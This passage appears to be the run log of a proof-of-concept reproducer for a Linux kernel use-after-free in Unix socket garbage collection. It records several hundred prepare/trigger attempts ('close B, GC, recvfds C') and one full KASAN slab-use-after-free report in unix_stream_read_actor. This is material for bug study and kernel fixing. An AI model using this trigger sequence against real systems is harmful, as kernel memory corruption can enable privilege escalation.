[*] attempt 21/256: trigger_uaf -> 0
[*] attempt 22/256: prepare_uaf
[*] attempt 22/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 22/256: trigger_uaf -> 0
[*] attempt 23/256: prepare_uaf
[*] attempt 23/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 23/256: trigger_uaf -> 0
[*] attempt 24/256: prepare_uaf
[*] attempt 24/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 24/256: trigger_uaf -> 0
[*] attempt 25/256: prepare_uaf
[*] attempt 25/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 25/256: trigger_uaf -> 0
[*] attempt 26/256: prepare_uaf
[*] attempt 26/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 26/256: trigger_uaf -> 0
[*] attempt 27/256: prepare_uaf
[*] attempt 27/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 27/256: trigger_uaf -> 0
[*] attempt 28/256: prepare_uaf
[*] attempt 28/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 28/256: trigger_uaf -> 0
[*] attempt 29/256: prepare_uaf
[*] attempt 29/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 29/256: trigger_uaf -> 0
[*] attempt 30/256: prepare_uaf
[*] attempt 30/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 30/256: trigger_uaf -> 0
[*] attempt 31/256: prepare_uaf
[*] attempt 31/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 31/256: trigger_uaf -> 0
[*] attempt 32/256: prepare_uaf
[*] attempt 32/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 32/256: trigger_uaf -> 0
[*] attempt 33/256: prepare_uaf
[*] attempt 33/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 33/256: trigger_uaf -> 0
[*] attempt 34/256: prepare_uaf
[*] attempt 34/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 34/256: trigger_uaf -> 0
[*] attempt 35/256: prepare_uaf
[*] attempt 35/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 35/256: trigger_uaf -> 0
[*] attempt 36/256: prepare_uaf
[*] attempt 36/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 36/256: trigger_uaf -> 0
[*] attempt 37/256: prepare_uaf
[*] attempt 37/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 37/256: trigger_uaf -> 0
[*] attempt 38/256: prepare_uaf
[*] attempt 38/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 38/256: trigger_uaf -> 0
[*] attempt 39/256: prepare_uaf
[*] attempt 39/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 39/256: trigger_uaf -> 0
[*] attempt 40/256: prepare_uaf
[*] attempt 40/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 40/256: trigger_uaf -> 0
[*] attempt 41/256: prepare_uaf
[*] attempt 41/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 41/256: trigger_uaf -> 0
[*] attempt 42/256: prepare_uaf
[*] attempt 42/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 42/256: trigger_uaf -> 0
[*] attempt 43/256: prepare_uaf
[*] attempt 43/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 43/256: trigger_uaf -> 0
[*] attempt 44/256: prepare_uaf
[*] attempt 44/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 44/256: trigger_uaf -> 0
[*] attempt 45/256: prepare_uaf
[*] attempt 45/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 45/256: trigger_uaf -> 0
[*] attempt 46/256: prepare_uaf
[*] attempt 46/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 46/256: trigger_uaf -> 0
[*] attempt 47/256: prepare_uaf
[*] attempt 47/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 47/256: trigger_uaf -> 0
[*] attempt 48/256: prepare_uaf
[*] attempt 48/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 48/256: trigger_uaf -> 0
[*] attempt 49/256: prepare_uaf
[*] attempt 49/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 49/256: trigger_uaf -> 0
[*] attempt 50/256: prepare_uaf
[*] attempt 50/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 50/256: trigger_uaf -> 0
[*] attempt 51/256: prepare_uaf
[*] attempt 51/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 51/256: trigger_uaf -> 0
[*] attempt 52/256: prepare_uaf
[*] attempt 52/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 52/256: trigger_uaf -> 0
[*] attempt 53/256: prepare_uaf
[*] attempt 53/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 53/256: trigger_uaf -> 0
[*] attempt 54/256: prepare_uaf
[*] attempt 54/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 54/256: trigger_uaf -> 0
[*] attempt 55/256: prepare_uaf
[*] attempt 55/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 55/256: trigger_uaf -> 0
[*] attempt 56/256: prepare_uaf
[*] attempt 56/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 56/256: trigger_uaf -> 0
[*] attempt 57/256: prepare_uaf
[*] attempt 57/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 57/256: trigger_uaf -> 0
[*] attempt 58/256: prepare_uaf
[*] attempt 58/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 58/256: trigger_uaf -> 0
[*] attempt 59/256: prepare_uaf
[*] attempt 59/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 59/256: trigger_uaf -> 0
[*] attempt 60/256: prepare_uaf
[*] attempt 60/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 60/256: trigger_uaf -> 0
[*] attempt 61/256: prepare_uaf
[*] attempt 61/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 61/256: trigger_uaf -> 0
[*] attempt 62/256: prepare_uaf
[*] attempt 62/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 62/256: trigger_uaf -> 0
[*] attempt 63/256: prepare_uaf
[*] attempt 63/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 63/256: trigger_uaf -> 0
[*] attempt 64/256: prepare_uaf
[*] attempt 64/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 64/256: trigger_uaf -> 0
[*] attempt 65/256: prepare_uaf
[*] attempt 65/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 65/256: trigger_uaf -> 0
[*] attempt 66/256: prepare_uaf
[*] attempt 66/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 66/256: trigger_uaf -> 0
[*] attempt 67/256: prepare_uaf
[*] attempt 67/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 67/256: trigger_uaf -> 0
[*] attempt 68/256: prepare_uaf
[*] attempt 68/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 68/256: trigger_uaf -> 0
[*] attempt 69/256: prepare_uaf
[*] attempt 69/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 69/256: trigger_uaf -> 0
[*] attempt 70/256: prepare_uaf
[*] attempt 70/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 70/256: trigger_uaf -> 0
[*] attempt 71/256: prepare_uaf
[*] attempt 71/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 71/256: trigger_uaf -> 0
[*] attempt 72/256: prepare_uaf
[*] attempt 72/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 72/256: trigger_uaf -> 0
[*] attempt 73/256: prepare_uaf
[*] attempt 73/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 73/256: trigger_uaf -> 0
[*] attempt 74/256: prepare_uaf
[*] attempt 74/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 74/256: trigger_uaf -> 0
[*] attempt 75/256: prepare_uaf
[*] attempt 75/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 75/256: trigger_uaf -> 0
[*] attempt 76/256: prepare_uaf
[*] attempt 76/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 76/256: trigger_uaf -> 0
[*] attempt 77/256: prepare_uaf
[*] attempt 77/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 77/256: trigger_uaf -> 0
[*] attempt 78/256: prepare_uaf
[*] attempt 78/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 78/256: trigger_uaf -> 0
[*] attempt 79/256: prepare_uaf
[*] attempt 79/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 79/256: trigger_uaf -> 0
[*] attempt 80/256: prepare_uaf
[*] attempt 80/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 80/256: trigger_uaf -> 0
[*] attempt 81/256: prepare_uaf
[*] attempt 81/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 81/256: trigger_uaf -> 0
[*] attempt 82/256: prepare_uaf
[*] attempt 82/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 82/256: trigger_uaf -> 0
[*] attempt 83/256: prepare_uaf
[*] attempt 83/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 83/256: trigger_uaf -> 0
[*] attempt 84/256: prepare_uaf
[*] attempt 84/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 84/256: trigger_uaf -> 0
[*] attempt 85/256: prepare_uaf
[*] attempt 85/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 85/256: trigger_uaf -> 0
[*] attempt 86/256: prepare_uaf
[*] attempt 86/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 86/256: trigger_uaf -> 0
[*] attempt 87/256: prepare_uaf
[*] attempt 87/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 87/256: trigger_uaf -> 0
[*] attempt 88/256: prepare_uaf
[*] attempt 88/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 88/256: trigger_uaf -> 0
[*] attempt 89/256: prepare_uaf
[*] attempt 89/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 89/256: trigger_uaf -> 0
[*] attempt 90/256: prepare_uaf
[*] attempt 90/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 90/256: trigger_uaf -> 0
[*] attempt 91/256: prepare_uaf
[*] attempt 91/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 91/256: trigger_uaf -> 0
[*] attempt 92/256: prepare_uaf
[*] attempt 92/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 92/256: trigger_uaf -> 0
[*] attempt 93/256: prepare_uaf
[*] attempt 93/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 93/256: trigger_uaf -> 0
[*] attempt 94/256: prepare_uaf
[*] attempt 94/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 94/256: trigger_uaf -> 0
[*] attempt 95/256: prepare_uaf
[*] attempt 95/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 95/256: trigger_uaf -> 0
[*] attempt 96/256: prepare_uaf
[*] attempt 96/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 96/256: trigger_uaf -> 0
[*] attempt 97/256: prepare_uaf
[*] attempt 97/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 97/256: trigger_uaf -> 0
[*] attempt 98/256: prepare_uaf
[*] attempt 98/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 98/256: trigger_uaf -> 0
[*] attempt 99/256: prepare_uaf
[*] attempt 99/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 99/256: trigger_uaf -> 0
[*] attempt 100/256: prepare_uaf
[*] attempt 100/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 100/256: trigger_uaf -> 0
[*] attempt 101/256: prepare_uaf
[*] attempt 101/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 101/256: trigger_uaf -> 0
[*] attempt 102/256: prepare_uaf
[*] attempt 102/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 102/256: trigger_uaf -> 0
[*] attempt 103/256: prepare_uaf
[*] attempt 103/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 103/256: trigger_uaf -> 0
[*] attempt 104/256: prepare_uaf
[*] attempt 104/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 104/256: trigger_uaf -> 0
[*] attempt 105/256: prepare_uaf
[*] attempt 105/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 105/256: trigger_uaf -> 0
[*] attempt 106/256: prepare_uaf
[*] attempt 106/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 106/256: trigger_uaf -> 0
[*] attempt 107/256: prepare_uaf
[*] attempt 107/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 107/256: trigger_uaf -> 0
[*] attempt 108/256: prepare_uaf
[*] attempt 108/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 108/256: trigger_uaf -> 0
[*] attempt 109/256: prepare_uaf
[*] attempt 109/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 109/256: trigger_uaf -> 0
[*] attempt 110/256: prepare_uaf
[*] attempt 110/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 110/256: trigger_uaf -> 0
[*] attempt 111/256: prepare_uaf
[*] attempt 111/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 111/256: trigger_uaf -> 0
[*] attempt 112/256: prepare_uaf
[*] attempt 112/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 112/256: trigger_uaf -> 0
[*] attempt 113/256: prepare_uaf
[*] attempt 113/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 113/256: trigger_uaf -> 0
[*] attempt 114/256: prepare_uaf
[*] attempt 114/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 114/256: trigger_uaf -> 0
[*] attempt 115/256: prepare_uaf
[*] attempt 115/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 115/256: trigger_uaf -> 0
[*] attempt 116/256: prepare_uaf
[*] attempt 116/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 116/256: trigger_uaf -> 0
[*] attempt 117/256: prepare_uaf
[*] attempt 117/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 117/256: trigger_uaf -> 0
[*] attempt 118/256: prepare_uaf
[*] attempt 118/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 118/256: trigger_uaf -> 0
[*] attempt 119/256: prepare_uaf
[*] attempt 119/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 119/256: trigger_uaf -> 0
[*] attempt 120/256: prepare_uaf
[*] attempt 120/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 120/256: trigger_uaf -> 0
[*] attempt 121/256: prepare_uaf
[*] attempt 121/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 121/256: trigger_uaf -> 0
[*] attempt 122/256: prepare_uaf
[*] attempt 122/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 122/256: trigger_uaf -> 0
[*] attempt 123/256: prepare_uaf
[*] attempt 123/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 123/256: trigger_uaf -> 0
[*] attempt 124/256: prepare_uaf
[*] attempt 124/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 124/256: trigger_uaf -> 0
[*] attempt 125/256: prepare_uaf
[*] attempt 125/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 125/256: trigger_uaf -> 0
[*] attempt 126/256: prepare_uaf
[*] attempt 126/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 126/256: trigger_uaf -> 0
[*] attempt 127/256: prepare_uaf
[*] attempt 127/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 127/256: trigger_uaf -> 0
[*] attempt 128/256: prepare_uaf
[*] attempt 128/256: trigger_uaf (close B, GC, recvfds C)
[   10.866831] ==================================================================
[   10.868022] BUG: KASAN: slab-use-after-free in unix_stream_read_actor+0x86/0xb0
[   10.869248] Read of size 4 at addr ffff888008813684 by task poc/65
[   10.870252] 
[   10.870581] CPU: 0 UID: 0 PID: 65 Comm: poc Not tainted 6.12.0-dirty #1
[   10.871579] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[   10.873093] Call Trace:
[   10.873513]  <TASK>
[   10.873871]  dump_stack_lvl+0x53/0x70
[   10.874799]  print_report+0xce/0x660
[   10.875404]  ? unix_stream_read_actor+0x86/0xb0
[   10.876162]  kasan_report+0xc6/0x100
[   10.876692]  ? unix_stream_read_actor+0x86/0xb0
[   10.877363]  ? __pfx_unix_stream_recvmsg+0x10/0x10
[   10.878090]  unix_stream_read_actor+0x86/0xb0
[   10.878897]  unix_stream_read_generic+0x195d/0x2550
[   10.880194]  ? __pfx_unix_stream_recvmsg+0x10/0x10
[   10.881390]  ? sock_do_ioctl+0x10e/0x260
[   10.882126]  ? __pfx_unix_stream_read_generic+0x10/0x10
[   10.883018]  ? __pfx_selinux_socket_recvmsg+0x10/0x10
[   10.883664]  ? __pfx_unix_stream_recvmsg+0x10/0x10
[   10.884295]  unix_stream_recvmsg+0x9e/0xe0
[   10.884851]  ? __pfx_unix_stream_recvmsg+0x10/0x10
[   10.885472]  ? __pfx_unix_stream_read_actor+0x10/0x10
[   10.886141]  ? security_socket_recvmsg+0x2c/0x60
[   10.886761]  sock_recvmsg+0x1b1/0x220
[   10.887244]  ? sockfd_lookup_light+0x13/0x140
[   10.887835]  __sys_recvfrom+0x15a/0x260
[   10.888299]  ? __pfx___sys_recvfrom+0x10/0x10
[   10.888858]  ? avc_has_perm+0x100/0x250
[   10.889375]  __x64_sys_recvfrom+0xdb/0x1b0
[   10.889965]  ? clear_bhb_loop+0x55/0xb0
[   10.890509]  ? clear_bhb_loop+0x55/0xb0
[   10.891065]  ? clear_bhb_loop+0x55/0xb0
[   10.891611]  do_syscall_64+0xa6/0x1a0
[   10.892147]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   10.892835] RIP: 0033:0x441044
[   10.893303] Code: 89 4c 24 1c e8 bd 2a 02 00 44 8b 54 24 1c 8b 3c 24 45 31 c9 89 c5 48 8b 54 24 10 48 8b 74 24 08 45 31 c0 b8 2d 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 34 89 ef 48 89 04 24 e8 09 2b 02 00 48 8b 04
[   10.895808] RSP: 002b:00007ffca421cd50 EFLAGS: 00000246 ORIG_RAX: 000000000000002d
[   10.896867] RAX: ffffffffffffffda RBX: 0000000000000020 RCX: 0000000000441044
[   10.900385] RDX: 0000000000000001 RSI: 00007ffca421cdf0 RDI: 0000000000000020
[   10.902504] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[   10.904238] R10: 0000000000000003 R11: 0000000000000246 R12: 00007ffca421cea0
[   10.906567] R13: 00007ffca421cee2 R14: 00007ffca421cee0 R15: 000000003b2c6ca4
[   10.907477]  </TASK>
[   10.907806] 
[   10.908049] Allocated by task 65:
[   10.908538]  kasan_save_stack+0x33/0x60
[   10.909115]  kasan_save_track+0x14/0x30
[   10.909668]  __kasan_slab_alloc+0x6e/0x70
[   10.910295]  kmem_cache_alloc_node_noprof+0xe2/0x280
[   10.910990]  __alloc_skb+0x209/0x2d0
[   10.911530]  alloc_skb_with_frags+0x7e/0x870
[   10.912100]  sock_alloc_send_pskb+0x684/0x820
[   10.912745]  unix_stream_sendmsg+0x8d2/0xdc0
[   10.913365]  __sys_sendto+0x39c/0x410
[   10.913888]  __x64_sys_sendto+0xdb/0x1b0
[   10.914458]  do_syscall_64+0xa6/0x1a0
[   10.914984]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   10.915712] 
[   10.916050] Freed by task 29:
[   10.916534]  kasan_save_stack+0x33/0x60
[   10.917555]  kasan_save_track+0x14/0x30
[   10.921435]  kasan_save_free_info+0x3b/0x60
[   10.922759]  __kasan_slab_free+0x37/0x50
[   10.924192]  kmem_cache_free+0xce/0x380
[   10.924882]  __unix_gc+0x9e2/0x13a0
[   10.925528]  process_one_work+0x5bc/0xfe0
[   10.926242]  worker_thread+0x772/0x1390
[   10.926686]  kthread+0x23e/0x2f0
[   10.927053]  ret_from_fork+0x2c/0x70
[   10.927439]  ret_from_fork_asm+0x1a/0x30
[   10.927937] 
[   10.928156] The buggy address belongs to the object at ffff888008813640
[   10.928156]  which belongs to the cache skbuff_head_cache of size 224
[   10.930157] The buggy address is located 68 bytes inside of
[   10.930157]  freed 224-byte region [ffff888008813640, ffff888008813720)
[   10.931936] 
[   10.932198] The buggy address belongs to the physical page:
[   10.933285] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x8813
[   10.934496] flags: 0x100000000000000(node=0|zone=1)
[   10.935283] page_type: f5(slab)
[   10.935777] raw: 0100000000000000 ffff888006995a00 dead000000000122 0000000000000000
[   10.937113] raw: 0000000000000000 00000000800c000c 00000001f5000000 0000000000000000
[   10.940141] page dumped because: kasan: bad access detected
[   10.942588] 
[   10.943097] Memory state around the buggy address:
[   10.944292]  ffff888008813580: 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc
[   10.946085]  ffff888008813600: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
[   10.947142] >ffff888008813680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   10.948160]                    ^
[   10.948628]  ffff888008813700: fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc
[   10.949675]  ffff888008813780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   10.950531] ==================================================================
[   10.951468] Disabling lock debugging due to kernel taint
[*] attempt 128/256: trigger_uaf -> 1
[*] attempt 129/256: prepare_uaf
[*] attempt 129/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 129/256: trigger_uaf -> 0
[*] attempt 130/256: prepare_uaf
[*] attempt 130/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 130/256: trigger_uaf -> 0
[*] attempt 131/256: prepare_uaf
[*] attempt 131/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 131/256: trigger_uaf -> 0
[*] attempt 132/256: prepare_uaf
[*] attempt 132/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 132/256: trigger_uaf -> 0
[*] attempt 133/256: prepare_uaf
[*] attempt 133/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 133/256: trigger_uaf -> 0
[*] attempt 134/256: prepare_uaf
[*] attempt 134/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 134/256: trigger_uaf -> 1
[*] attempt 135/256: prepare_uaf
[*] attempt 135/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 135/256: trigger_uaf -> 0
[*] attempt 136/256: prepare_uaf
[*] attempt 136/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 136/256: trigger_uaf -> 0
[*] attempt 137/256: prepare_uaf
[*] attempt 137/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 137/256: trigger_uaf -> 0
[*] attempt 138/256: prepare_uaf
[*] attempt 138/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 138/256: trigger_uaf -> 1
[*] attempt 139/256: prepare_uaf
[*] attempt 139/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 139/256: trigger_uaf -> 0
[*] attempt 140/256: prepare_uaf
[*] attempt 140/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 140/256: trigger_uaf -> 0
[*] attempt 141/256: prepare_uaf
[*] attempt 141/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 141/256: trigger_uaf -> 0
[*] attempt 142/256: prepare_uaf
[*] attempt 142/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 142/256: trigger_uaf -> 0
[*] attempt 143/256: prepare_uaf
[*] attempt 143/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 143/256: trigger_uaf -> 1
[*] attempt 144/256: prepare_uaf
[*] attempt 144/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 144/256: trigger_uaf -> 0
[*] attempt 145/256: prepare_uaf
[*] attempt 145/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 145/256: trigger_uaf -> 0
[*] attempt 146/256: prepare_uaf
[*] attempt 146/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 146/256: trigger_uaf -> 0
[*] attempt 147/256: prepare_uaf
[*] attempt 147/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 147/256: trigger_uaf -> 0
[*] attempt 148/256: prepare_uaf
[*] attempt 148/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 148/256: trigger_uaf -> 0
[*] attempt 149/256: prepare_uaf
[*] attempt 149/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 149/256: trigger_uaf -> 0
[*] attempt 150/256: prepare_uaf
[*] attempt 150/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 150/256: trigger_uaf -> 0
[*] attempt 151/256: prepare_uaf
[*] attempt 151/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 151/256: trigger_uaf -> 1
[*] attempt 152/256: prepare_uaf
[*] attempt 152/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 152/256: trigger_uaf -> 0
[*] attempt 153/256: prepare_uaf
[*] attempt 153/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 153/256: trigger_uaf -> 0
[*] attempt 154/256: prepare_uaf
[*] attempt 154/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 154/256: trigger_uaf -> 0
[*] attempt 155/256: prepare_uaf
[*] attempt 155/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 155/256: trigger_uaf -> 0
[*] attempt 156/256: prepare_uaf
[*] attempt 156/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 156/256: trigger_uaf -> 0
[*] attempt 157/256: prepare_uaf
[*] attempt 157/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 157/256: trigger_uaf -> 1
[*] attempt 158/256: prepare_uaf
[*] attempt 158/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 158/256: trigger_uaf -> 0
[*] attempt 159/256: prepare_uaf
[*] attempt 159/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 159/256: trigger_uaf -> 0
[*] attempt 160/256: prepare_uaf
[*] attempt 160/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 160/256: trigger_uaf -> 0
[*] attempt 161/256: prepare_uaf
[*] attempt 161/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 161/256: trigger_uaf -> 1
[*] attempt 162/256: prepare_uaf
[*] attempt 162/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 162/256: trigger_uaf -> 1
[*] attempt 163/256: prepare_uaf
[*] attempt 163/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 163/256: trigger_uaf -> 0
[*] attempt 164/256: prepare_uaf
[*] attempt 164/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 164/256: trigger_uaf -> 1
[*] attempt 165/256: prepare_uaf
[*] attempt 165/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 165/256: trigger_uaf -> 1
[*] attempt 166/256: prepare_uaf
[*] attempt 166/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 166/256: trigger_uaf -> 1
[*] attempt 167/256: prepare_uaf
[*] attempt 167/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 167/256: trigger_uaf -> 0
[*] attempt 168/256: prepare_uaf
[*] attempt 168/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 168/256: trigger_uaf -> 0
[*] attempt 169/256: prepare_uaf
[*] attempt 169/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 169/256: trigger_uaf -> 0
[*] attempt 170/256: prepare_uaf
[*] attempt 170/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 170/256: trigger_uaf -> 0
[*] attempt 171/256: prepare_uaf
[*] attempt 171/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 171/256: trigger_uaf -> 0
[*] attempt 172/256: prepare_uaf
[*] attempt 172/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 172/256: trigger_uaf -> 0
[*] attempt 173/256: prepare_uaf
[*] attempt 173/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 173/256: trigger_uaf -> 0
[*] attempt 174/256: prepare_uaf
[*] attempt 174/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 174/256: trigger_uaf -> 0
[*] attempt 175/256: prepare_uaf
[*] attempt 175/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 175/256: trigger_uaf -> 1
[*] attempt 176/256: prepare_uaf
[*] attempt 176/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 176/256: trigger_uaf -> 1
[*] attempt 177/256: prepare_uaf
[*] attempt 177/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 177/256: trigger_uaf -> 0
[*] attempt 178/256: prepare_uaf
[*] attempt 178/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 178/256: trigger_uaf -> 1
[*] attempt 179/256: prepare_uaf
[*] attempt 179/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 179/256: trigger_uaf -> 0
[*] attempt 180/256: prepare_uaf
[*] attempt 180/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 180/256: trigger_uaf -> 0
[*] attempt 181/256: prepare_uaf
[*] attempt 181/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 181/256: trigger_uaf -> 0
[*] attempt 182/256: prepare_uaf
[*] attempt 182/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 182/256: trigger_uaf -> 0
[*] attempt 183/256: prepare_uaf
[*] attempt 183/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 183/256: trigger_uaf -> 0
[*] attempt 184/256: prepare_uaf
[*] attempt 184/256: trigger_uaf (close B, GC, recvfds C)
